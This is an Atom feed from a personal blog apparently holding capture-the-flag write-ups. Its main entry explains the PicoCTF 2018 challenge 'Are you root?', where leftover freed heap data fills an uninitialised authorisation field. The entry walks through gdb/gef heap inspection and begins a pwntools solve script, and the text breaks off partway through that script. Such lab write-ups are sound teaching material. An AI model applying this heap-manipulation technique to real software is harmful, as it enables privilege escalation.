<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://christopher-nguyen-re.github.io/blog</id>
    <title>My Site Blog</title>
    <updated>2022-05-01T00:00:00.000Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://christopher-nguyen-re.github.io/blog"/>
    <subtitle>My Site Blog</subtitle>
    <icon>https://christopher-nguyen-re.github.io/img/favicon.ico</icon>
    <entry>
        <title type="html"><![CDATA[Level 1]]></title>
        <id>level-1</id>
        <link href="https://christopher-nguyen-re.github.io/blog/level-1"/>
        <updated>2022-05-01T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Level 1]]></summary>
        <content type="html"><![CDATA[<p>Level 1</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="the-challenge">The Challenge<a class="hash-link" href="#the-challenge" title="Direct link to heading">​</a></h2><p>File can be downloaded <a href="/files/level_1/level-1">here</a> (Right click and open in new tab).</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="analysis">Analysis<a class="hash-link" href="#analysis" title="Direct link to heading">​</a></h2><p>s</p>]]></content>
        <author>
            <name>Christopher Nguyen</name>
            <uri>https://github.com/christopher-nguyen-re</uri>
        </author>
        <category label="Binary Exploitation" term="Binary Exploitation"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Are you root?]]></title>
        <id>are-you-root</id>
        <link href="https://christopher-nguyen-re.github.io/blog/are-you-root"/>
        <updated>2022-03-01T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[2018 PicoCTF: Are you root?]]></summary>
        <content type="html"><![CDATA[<p>2018 PicoCTF: Are you root?</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="the-challenge">The Challenge<a class="hash-link" href="#the-challenge" title="Direct link to heading">​</a></h2><p>The provided executable <a href="/files/are_you_root/auth">here</a></p><p>The goal is to obtain the flag.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="analysis">Analysis<a class="hash-link" href="#analysis" title="Direct link to heading">​</a></h2><p>Running the program on a terminal gives us an interface we can login as a user. We are given the option to set the authorization level below 5. In order to get the flag, we must be able to set the authorization to level 5.</p><p>After looking through the source file, we can see that allocated memory is not initalized for the <code>user</code> struct member <code>level</code>. <code>user-&gt;name</code> is free'd upon receiving the <code>reset</code> command but the <code>user</code> struct itself is not freed.</p><p>We can use gdb with the gef extension to look more closely into the heap memory as we run the program. I have a breakpoint set at <code>putchar</code> as it is right before <code>fgets</code> is called for user input. I run <code>heap chunks</code> and <code>heap bins</code> to look at the current status of the heap.</p><p><img loading="lazy" alt="Initial heap and bin" src="/assets/images/initial_heap-11232ec222d57333b1d6d72d7df1fc7b.png" width="756" height="383" class="img_E7b_"></p><p>As expected, there is no memory allocated on the heap or stored in bins yet.</p><p>I enter <code>login aaaaaaaaaaaaaaaaaaaa</code> to login as a user named containg 20 'A's and look at <code>heap chunks</code> and <code>heap bins</code>.</p><p><img loading="lazy" alt="Heap and bin after first login" src="/assets/images/login_heap-c0499ca9ce7bd9cf1b5a09c4cfc06701.png" width="875" height="531" class="img_E7b_"></p><p>Viewing the chunks shows the stdin buffer containing the input string. Under it is a chunk that contains a pointer to the chunk below it. This makes me think that it is the user struct containing the pointer to the user name. The chunk with user name contains the 'a's as expected.</p><p>I enter <code>reset</code> to free user name and look at the updated <code>heap chunks</code> and <code>heap bins</code>.</p><p><img loading="lazy" alt="Heap and bin after reset" src="/assets/images/reset-f0608a2f1731574c00c2e87d58f3275f.png" width="900" height="532" class="img_E7b_"></p><p>When free is called on <code>user-&gt;name</code>, the chunk containing the name string is stored in tcache.</p><p>If we log in again and look at the heap chunks, we can see that the free'd memory still contains a part of the username provided previously. The first 8 bytes are zero'd out but the rest remain the same. I enter <code>login b</code> and view the updated heap and bins.</p><p><img loading="lazy" alt="Logging in after reset" src="/assets/images/second_login-2a56509d23c9f64935928c5b951fadac.png" width="931" height="567" class="img_E7b_"></p><p>The chunk at 0x603260 is the stdin buffer as it contains <code>reset</code> and 'a's. The 'a's are still there because stdin is not flushed and a null terminator separates the strings. The user struct is still in the chunks since it was not freed. Tcache is now empty because the chunk is being reused by the new user struct.</p><p>Entering <code>show</code> then gives us the output below:</p><p><img loading="lazy" alt="show on second login" src="data:image/png;base64,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" width="366" height="124" class="img_E7b_"></p><p>The authorization level is actually the decimal conversion of 4 'a's. These 'a's are the ones that had remained on the heap after <code>user-&gt;name</code> had been free'd from the <code>reset</code> command.</p><p>We can manipulate the heap in a way so that the value <code>5</code> will be stored in the new user's level from running <code>login</code>. I will have the first 8 bytes set as 'a's and the following byte to be 0x05.</p><div class="codeBlockContainer_I0IT language-python theme-code-block"><div class="codeBlockContent_wNvx" style="color:#393A34;background-color:#f6f8fa"><pre tabindex="0" class="prism-code language-python codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">#!/usr/bin/env python3</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token triple-quoted-string string" style="color:#e3116c">"""</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">Toast's submission for the challenge 'Are you Root'.</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="display:inline-block;color:#e3116c"></span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">This script can be used in the following manner:</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">python3 ./solve.py</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="display:inline-block;color:#e3116c"></span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">Returns:</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">    The flag to solve the challenge.</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">"""</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> pwn </span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exe </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ELF</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"./auth"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">libc </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ELF</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"./libc.so.6"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ld </span><span class="token operator" 